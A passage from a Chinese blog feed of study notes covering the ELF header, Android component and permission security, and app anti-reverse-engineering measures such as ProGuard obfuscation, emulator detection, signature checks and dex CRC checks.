class="hljs-number">4</span>c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">Class</span>:                             ELF<span class="hljs-number">32</span><br>  <span class="hljs-attribute">Data</span>:                              <span class="hljs-number">2</span>&#x27;s complement, little endian<br>  <span class="hljs-attribute">Version</span>:                           <span class="hljs-number">1</span> (current)<br>  <span class="hljs-attribute">OS</span>/ABI:                            UNIX - System V<br>  <span class="hljs-attribute">ABI</span> Version:                       <span class="hljs-number">0</span><br>  <span class="hljs-attribute">Type</span>:                              REL (Relocatable file)<br>  <span class="hljs-attribute">Machine</span>:                           Intel <span class="hljs-number">80386</span><br>  <span class="hljs-attribute">Version</span>:                           <span class="hljs-number">0</span>x<span class="hljs-number">1</span><br>  <span class="hljs-attribute">Entry</span> point address:               <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br>  <span class="hljs-attribute">Start</span> of program headers:          <span class="hljs-number">0</span> (bytes into file)<br>  <span class="hljs-attribute">Start</span> of section headers:          <span class="hljs-number">372</span> (bytes into file)<br>  <span class="hljs-attribute">Flags</span>:                             <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br>  <span class="hljs-attribute">Size</span> of this header:               <span class="hljs-number">52</span> (bytes)<br>  <span class="hljs-attribute">Size</span> of program headers:           <span class="hljs-number">0</span> (bytes)<br>  <span class="hljs-attribute">Number</span> of program headers:         <span class="hljs-number">0</span><br>  <span class="hljs-attribute">Size</span> of section headers:           <span class="hljs-number">40</span> (bytes)<br>  <span class="hljs-attribute">Number</span> of section headers:         <span class="hljs-number">13</span><br>  <span class="hljs-attribute">Section</span> header string table index: <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><strong>Magic:</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">前<span class="hljs-number">4</span>个字节<span class="hljs-symbol">:</span>魔数<br>第<span class="hljs-number">5</span>个字节<span class="hljs-symbol">:</span>表示ELF文件类  <span class="hljs-comment">#0 无效文件; 1 32位文件; 2 64位文件</span><br>第<span class="hljs-number">6</span>个字节<span class="hljs-symbol">:</span>字节序  <span class="hljs-comment">#0 大端序; 1 小端序</span><br>第<span class="hljs-number">7</span>个字节<span class="hljs-symbol">:ELF</span>主版本号    <span class="hljs-comment">#一般是1</span><br></code></pre></td></tr></table></figure><p><strong>文件类型 Type:</strong></p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200402220224868.png" alt="image-20200402220224868"></p><p><strong>机器类型 Machine:</strong> </p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200402220328247.png" alt="image-20200402220328247"></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android系统攻击与防范</title>
    <link href="/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
    <url>/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="手机ROOT"><a href="#手机ROOT" class="headerlink" title="手机ROOT"></a>手机ROOT</h1><p>指用户获得ROOT权限，即最高权限。（我要吐槽，我把红米ROOT后，也就那么一点点权限，很多事情都不做，骗子。）</p><h2 id="ROOT后的安全隐患"><a href="#ROOT后的安全隐患" class="headerlink" title="ROOT后的安全隐患"></a>ROOT后的安全隐患</h2><ul><li>可能导致误删造成系统不稳定</li><li>病毒入侵，自己拥有root权限，攻击者也可以拥有，所以病毒更容易入侵。</li><li>隐私数据暴露，root权限可直接读文件，数据容易暴露</li></ul><h2 id="ROOT原理"><a href="#ROOT原理" class="headerlink" title="ROOT原理"></a>ROOT原理</h2><p>我才知道，很多root工具是利用了Android原本的漏洞，一直以为是专门预留的…….利用提权漏洞进行root提权。</p><p>可以下载Xray for Android 是否可以通过漏洞获取root权限。</p><p>su与superuser.apk协作对root权限进行管理。</p><h1 id="Android权限攻击"><a href="#Android权限攻击" class="headerlink" title="Android权限攻击"></a>Android权限攻击</h1><h2 id="权限检查机制"><a href="#权限检查机制" class="headerlink" title="权限检查机制"></a>权限检查机制</h2><p>使用特定权限，需要在AndroidManifest中设置。</p><h2 id="串谋权限攻击"><a href="#串谋权限攻击" class="headerlink" title="串谋权限攻击"></a>串谋权限攻击</h2><p>通过其他程序的Android组件突破权限限制。</p><h2 id="权限攻击检测"><a href="#权限攻击检测" class="headerlink" title="权限攻击检测"></a>权限攻击检测</h2><p>Mercury可批量检测权限攻击组件。</p><h1 id="Android组件安全"><a href="#Android组件安全" class="headerlink" title="Android组件安全"></a>Android组件安全</h1><h2 id="Activity安全"><a href="#Activity安全" class="headerlink" title="Activity安全"></a>Activity安全</h2><p>首先看<code>android:exported</code>是否可导出。</p><p>允许特定程序需要使用<code>android:permission</code>：</p><p><img src="/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/image-20200324215326188.png" alt="image-20200324215326188"></p><p>如果要访问带有<code>android:permission</code>的Activuty，需要在AndroidManifest中声明权限：</p><p><img src="/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/image-20200324215426533.png" alt="image-20200324215426533"></p><h2 id="Broadcast-Receiver安全"><a href="#Broadcast-Receiver安全" class="headerlink" title="Broadcast Receiver安全"></a>Broadcast Receiver安全</h2><p>一般来说，一个广播可以被相应的Action接收，可能造成广播被窃取。</p><p>可以通过intent指定某个Android组件或类接收广播。</p><h2 id="Service安全"><a href="#Service安全" class="headerlink" title="Service安全"></a>Service安全</h2><p>service在后台运行，可能发生如下安全问题：</p><p><img src="/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/image-20200324220934330.png" alt="image-20200324220934330"></p><p>可通过<code>android:exported</code>和<code>android:permission</code>限制权限。</p><h2 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h2><p>内容提供者，用于程序之间的数据交换。</p><p>要限制其读写等权限，否则可能会存在串谋权限攻击。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android软件的反破解技术</title>
    <link href="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/"/>
    <url>/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p>Android逆向可以通过四个步骤：反编译、静态分析、动态调试、重编译。</p><h1 id="对抗反编译"><a href="#对抗反编译" class="headerlink" title="对抗反编译"></a>对抗反编译</h1><h2 id="如何对抗反编译工具"><a href="#如何对抗反编译工具" class="headerlink" title="如何对抗反编译工具"></a>如何对抗反编译工具</h2><p>寻找反编译工具的缺陷，使其反编译失败。</p><h3 id="阅读反编译工具源码"><a href="#阅读反编译工具源码" class="headerlink" title="阅读反编译工具源码"></a>阅读反编译工具源码</h3><p>需要较强的代码分析能力</p><h3 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h3><p>通过脚本测试大量apk，查找反编译工具的缺陷</p><h2 id="对抗dex2jar"><a href="#对抗dex2jar" class="headerlink" title="对抗dex2jar"></a>对抗dex2jar</h2><p>dex2jar可将dex文件转换为jar文件。</p><h1 id="对抗静态分析"><a href="#对抗静态分析" class="headerlink" title="对抗静态分析"></a>对抗静态分析</h1><h2 id="代码混淆技术"><a href="#代码混淆技术" class="headerlink" title="代码混淆技术"></a>代码混淆技术</h2><p>使用ProGuard进行混淆。</p><ol><li>在project.properties文件中添加<code>proguard.config=proguard.cfg</code>。</li><li>在proguard.cfg中设置需要混淆和保留的类和方法。</li></ol><p>现在在AS里会有这个文件：</p><p><img src="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/image-20200319161948039.png" alt="image-20200319161948039"></p><p>配置 build.gradle,</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">release &#123;<br>            <span class="hljs-regexp">//</span> 不显示log<br>            buildConfigField <span class="hljs-string">&quot;boolean&quot;</span>, <span class="hljs-string">&quot;LOG_DEBUG&quot;</span>, <span class="hljs-string">&quot;false&quot;</span><br>            <span class="hljs-regexp">//</span> 混淆<br>            minifyEnabled true<br>            <span class="hljs-regexp">//</span> Zipalign优化<br>            zipAlignEnabled true<br>            <span class="hljs-regexp">//</span> 移除无用的resource<br>            shrinkResources true<br>            <span class="hljs-regexp">//</span> 混淆配置<br>            proguardFiles getDefaultProguardFile(<span class="hljs-string">&#x27;proguard-android.txt&#x27;</span>), <span class="hljs-string">&#x27;proguard-rules.pro&#x27;</span><br>        &#125;<br><br></code></pre></td></tr></table></figure><p>我用debug模式混淆的时候，apk打不开，release版的成功了。</p><h3 id="proguard"><a href="#proguard" class="headerlink" title="proguard"></a>proguard</h3><p>proguard有以下功能：</p><ul><li>压缩(Shrink)：检测并移除代码中无用的类、字段、方法和特性（Attribute）。</li><li>优化(Optimize)：对字节码进行优化，移除无用的指令。</li><li>混淆(Obfuscate)：使用a，b，c，d这样简短而无意义的名称，对类、字段和方法进行重命名。</li><li>预检(Preveirfy)：在Java平台上对处理后的代码进行预检，确保加载的class文件是可执行的。</li></ul><p>常用配置</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span> 公共 <span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><br> <br><span class="hljs-comment">#指定代码的压缩级别</span><br>-optimizationpasses <span class="hljs-number">5</span><br> <br><span class="hljs-comment"># 混淆时所采用的算法</span><br>-optimizations !code<span class="hljs-regexp">/simplification/arithmetic,!field/</span>*,!<span class="hljs-class"><span class="hljs-keyword">class</span>/<span class="hljs-title">merging</span>/*</span><br> <br><span class="hljs-comment">#记录生成的日志数据,gradle build时在本项目根目录输出</span><br><span class="hljs-comment">#apk 包内所有 class 的内部结构</span><br>-dump class_files.txt<br><span class="hljs-comment">#未混淆的类和成员</span><br>-printseeds seeds.txt<br><span class="hljs-comment">#列出从 apk 中删除的代码</span><br>-printusage unused.txt<br><span class="hljs-comment">#混淆前后的映射</span><br>-printmapping mapping.txt<br> <br><span class="hljs-comment">#移除log代码</span><br>-assumenosideeffects <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">android</span>.<span class="hljs-title">util</span>.<span class="hljs-title">Log</span> &#123;</span><br>    public static *** v(...);<br>    public static *** i(...);<br>    public static *** d(...);<br>    public static *** w(...);<br>    public static *** e(...);<br>&#125;<br> <br><span class="hljs-comment">#不混淆反射用到的类</span><br>-keepattributes Signature<br>-keepattributes EnclosingMethod<br> <br><span class="hljs-comment">#保持继承自系统类的class不被混淆</span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">app</span>.<span class="hljs-title">Activity</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">app</span>.<span class="hljs-title">Application</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">app</span>.<span class="hljs-title">Service</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">content</span>.<span class="hljs-title">BroadcastReceiver</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">content</span>.<span class="hljs-title">ContentProvider</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">app</span>.<span class="hljs-title">backup</span>.<span class="hljs-title">BackupAgentHelper</span></span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">preference</span>.<span class="hljs-title">Preference</span></span><br>-keep interface android.support.v4.app.** &#123; *; &#125;<br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">android</span>.<span class="hljs-title">support</span>.<span class="hljs-title">v4</span>.** &#123; *; &#125;</span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">support</span>.<span class="hljs-title">v4</span>.**</span><br>-keep interface android.support.v7.app.** &#123; *; &#125;<br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">android</span>.<span class="hljs-title">support</span>.<span class="hljs-title">v7</span>.** &#123; *; &#125;</span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">support</span>.<span class="hljs-title">v7</span>.**</span><br>-keep public <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.<span class="hljs-title">app</span>.<span class="hljs-title">Fragment</span></span><br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-keyword">extends</span> <span class="hljs-title">android</span>.**&#123;*;&#125;</span><br> <br><span class="hljs-comment">#不混淆Serializable接口的子类中指定的某些成员变量和方法</span><br>-keepclassmembers <span class="hljs-class"><span class="hljs-keyword">class</span> * <span class="hljs-title">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> &#123;</span><br>    static final long serialVersionUID;<br>    private static final java.io.ObjectStreamField[] serialPersistentFields;<br>    private <span class="hljs-keyword">void</span> writeObject(java.io.ObjectOutputStream);<br>    private <span class="hljs-keyword">void</span> readObject(java.io.ObjectInputStream);<br>    java.lang.<span class="hljs-built_in">Object</span> writeReplace();<br>    java.lang.<span class="hljs-built_in">Object</span> readResolve();<br>&#125;<br> <br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span> Module自定义 <span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><br> <br><span class="hljs-comment">######</span><span class="hljs-comment">######</span> 不混淆引用的jar <span class="hljs-comment">######</span><span class="hljs-comment">######</span><br> <br><span class="hljs-comment">#不混淆butterknife</span><br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    @butterknife.* &lt;fields&gt;;<br>&#125;<br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    @butterknife.* &lt;methods&gt;;<br>&#125;<br>-dontwarn butterknife.internal.**<br> <br><span class="hljs-comment">#不混淆AndroidBootstrap</span><br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">com</span>.<span class="hljs-title">beardedhen</span>.<span class="hljs-title">androidbootstrap</span>.**&#123;*;&#125;</span><br>-dontwarn com.beardedhen.androidbootstrap.**<br> <br><span class="hljs-comment">#不混淆应用宝自更新jar</span><br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">com</span>.<span class="hljs-title">qq</span>.**</span><br>-dontwarn com.qq.**<br>-keep <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">com</span>.<span class="hljs-title">tencent</span>.**</span><br>-dontwarn com.tencent.**<br> <br><span class="hljs-comment">######</span><span class="hljs-comment">######</span> 保持自定义控件不被混淆 <span class="hljs-comment">######</span><span class="hljs-comment">######</span><br> <br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    public &lt;init&gt;(android.content.Context);<br>&#125;<br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    public &lt;init&gt;(android.content.Context, android.util.AttributeSet);<br>&#125;<br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    public &lt;init&gt;(android.content.Context, android.util.AttributeSet, int);<br>&#125;<br>-keepclasseswithmembernames <span class="hljs-class"><span class="hljs-keyword">class</span> * &#123;</span><br>    public &lt;init&gt;(android.content.Context, android.util.AttributeSet, int, int);<br>&#125;<br> <br><span class="hljs-comment">######</span><span class="hljs-comment">######</span> 项目内部类的混淆配置 <span class="hljs-comment">######</span><span class="hljs-comment">######</span><br> <br><span class="hljs-comment">#不混淆整个包</span><br><span class="hljs-comment">#-keep class com.test.test.**&#123;*;&#125;</span><br> <br><span class="hljs-comment">#不混淆对外接口的public类名和成员名，否则外部无法调用</span><br><span class="hljs-comment">#-keep public interface com.test.test.**&#123;*;&#125;</span><br><span class="hljs-comment">#-keep public enum com.test.test.**&#123;*;&#125;</span><br><span class="hljs-comment">#-keep public class com.test.test.**&#123;</span><br><span class="hljs-comment">#    public *;</span><br><span class="hljs-comment">#&#125;</span><br> <br><span class="hljs-comment">#忽略项目中其他Module的警告 ############</span><br><span class="hljs-comment">#-dontwarn com.test.test.**</span><br></code></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/wangwangli6/article/details/79800520">https://blog.csdn.net/wangwangli6/article/details/79800520</a></p><h2 id="NDK保护"><a href="#NDK保护" class="headerlink" title="NDK保护"></a>NDK保护</h2><p>使用NDK开发可增加逆向难度。</p><h2 id="外壳保护"><a href="#外壳保护" class="headerlink" title="外壳保护"></a>外壳保护</h2><p>加壳加固。</p><h1 id="对抗动态调试"><a href="#对抗动态调试" class="headerlink" title="对抗动态调试"></a>对抗动态调试</h1><h2 id="检测调试器"><a href="#检测调试器" class="headerlink" title="检测调试器"></a>检测调试器</h2><p>通过检查debuggable的值是否被修改过判断是否被调试。</p><p><img src="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/image-20200319163846893.png" alt="image-20200319163846893"></p><p>检测调试器是否连接：</p><p><img src="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/image-20200319164003984.png" alt="image-20200319164003984"></p><h2 id="检测模拟器"><a href="#检测模拟器" class="headerlink" title="检测模拟器"></a>检测模拟器</h2><p>通过命令<code>adb shell getprop</code>对比模拟器和真机。</p><p>真机：</p><p><img src="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/image-20200319164906736.png" alt="image-20200319164906736"></p><p>模拟器：</p><p><img src="/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/image-20200319175344380.png" alt="image-20200319175344380"></p><p>这不没区别吗。。。现在模拟器都这么先进了，书上有点落后了。。。</p><p>就贴一下旧代码吧，虽然不一定能用，以后也能作参考。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">检测代码：<br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isRunningInEmualtor</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">boolean</span> qemuKernel = <span class="hljs-keyword">false</span>;<br>    Process process = <span class="hljs-keyword">null</span>;<br>        DataOutputStream os = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;  <br>            process = Runtime.getRuntime().exec(<span class="hljs-string">&quot;getprop ro.kernel.qemu&quot;</span>);  <br>            os = <span class="hljs-keyword">new</span> DataOutputStream(process.getOutputStream());<br>            BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(process.getInputStream(),<span class="hljs-string">&quot;GBK&quot;</span>));<br>            os.writeBytes(<span class="hljs-string">&quot;exit\n&quot;</span>);  <br>            os.flush();<br>            process.waitFor();<br>            qemuKernel = (Integer.valueOf(in.readLine()) == <span class="hljs-number">1</span>);<br>            Log.d(<span class="hljs-string">&quot;com.droider.checkqemu&quot;</span>, <span class="hljs-string">&quot;检测到模拟器:&quot;</span> + qemuKernel);             <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;  <br>        qemuKernel = <span class="hljs-keyword">false</span>;<br>            Log.d(<span class="hljs-string">&quot;com.droider.checkqemu&quot;</span>, <span class="hljs-string">&quot;run failed&quot;</span> + e.getMessage()); <br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;  <br>                <span class="hljs-keyword">if</span> (os != <span class="hljs-keyword">null</span>) &#123;  <br>                    os.close();  <br>                &#125;  <br>                process.destroy();  <br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <br>            &#125;  <br>            Log.d(<span class="hljs-string">&quot;com.droider.checkqemu&quot;</span>, <span class="hljs-string">&quot;run finally&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">return</span> qemuKernel;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getProp</span><span class="hljs-params">(Context context, String property)</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>    ClassLoader cl = context.getClassLoader();<br>    Class SystemProperties = cl.loadClass(<span class="hljs-string">&quot;android.os.SystemProperties&quot;</span>);<br>    Method method = SystemProperties.getMethod(<span class="hljs-string">&quot;get&quot;</span>, String.class);<br>    Object[] params = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>];<br>    params[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String(property);<br>    <span class="hljs-keyword">return</span> (String)method.invoke(SystemProperties, params);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="防止重编译"><a href="#防止重编译" class="headerlink" title="防止重编译"></a>防止重编译</h1><h2 id="检查签名"><a href="#检查签名" class="headerlink" title="检查签名"></a>检查签名</h2><p>检查签名的hashcode是否一致。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getSignature</span><span class="hljs-params">(String packageName)</span> </span>&#123;      <br>PackageManager pm = <span class="hljs-keyword">this</span>.getPackageManager();<br>PackageInfo pi = <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">int</span> sig = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">try</span> &#123;<br>pi = pm.getPackageInfo(packageName, PackageManager.GET_SIGNATURES);<br>Signature[] s = pi.signatures;<br>sig = s[<span class="hljs-number">0</span>].hashCode();  <br>&#125; <span class="hljs-keyword">catch</span> (Exception e1) &#123;<br>sig = <span class="hljs-number">0</span>;<br>e1.printStackTrace();<br>&#125;<br><span class="hljs-keyword">return</span> sig;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="校验保护"><a href="#校验保护" class="headerlink" title="校验保护"></a>校验保护</h2><p>检测classes.dex的校验值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">checkCRC</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">boolean</span> beModified = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">long</span> crc = Long.parseLong(getString(R.string.crc));<br>    ZipFile zf;<br><span class="hljs-keyword">try</span> &#123;<br>zf = <span class="hljs-keyword">new</span> ZipFile(getApplicationContext().getPackageCodePath());<br>    ZipEntry ze = zf.getEntry(<span class="hljs-string">&quot;classes.dex&quot;</span>);<br>    Log.d(<span class="hljs-string">&quot;com.droider.checkcrc&quot;</span>, String.valueOf(ze.getCrc()));<br>    <span class="hljs-keyword">if</span> (ze.getCrc() == 